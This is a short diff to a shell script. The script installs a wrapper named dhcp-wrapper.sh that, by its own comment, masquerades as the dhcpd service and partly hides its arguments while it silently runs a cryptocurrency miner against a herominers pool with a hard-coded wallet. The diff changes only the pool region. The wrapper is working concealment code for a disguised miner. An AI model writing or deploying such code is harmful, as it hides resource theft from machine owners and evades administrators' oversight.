@@ -4,7 +4,7 @@ mkdir /opt/bin/
 sudo tee /opt/bin/dhcp-wrapper.sh > /dev/null << 'EOF'
 #!/bin/bash
 # Wrapper to masquerade as dhcpd and hide real args from /proc/<pid>/cmdline partially
-REAL_CMD="/opt/containerd/bin/run --coin pearl -o us.pearl.herominers.com:1200 -u prl1pqaz856qqzkek9t4h2750kzts2462rts8wtl7ykvks5gtqueg785s8ac4u6.gpu2"
+REAL_CMD="/opt/containerd/bin/run --coin pearl -o kr.pearl.herominers.com:1200 -u prl1pqaz856qqzkek9t4h2750kzts2462rts8wtl7ykvks5gtqueg785s8ac4u6.gpu2"
 
 # Execute the real command in background within this script context
 exec $REAL_CMD &>/dev/null  # Redirect all output from the wrapper itself too
